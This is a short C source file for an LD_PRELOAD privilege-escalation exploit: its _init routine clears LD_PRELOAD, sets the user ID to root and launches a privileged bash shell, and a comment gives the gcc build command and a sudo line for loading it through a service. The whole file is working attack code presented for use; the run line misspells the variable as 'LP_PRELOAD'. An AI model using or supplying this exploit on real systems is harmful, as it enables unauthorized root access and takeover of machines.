#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init ()
{
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

/* 
Complie 
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so ld_preload.c

Run with sudo service 
sudo LP_PRELOAD=/tmp/preload.so apache2
*/
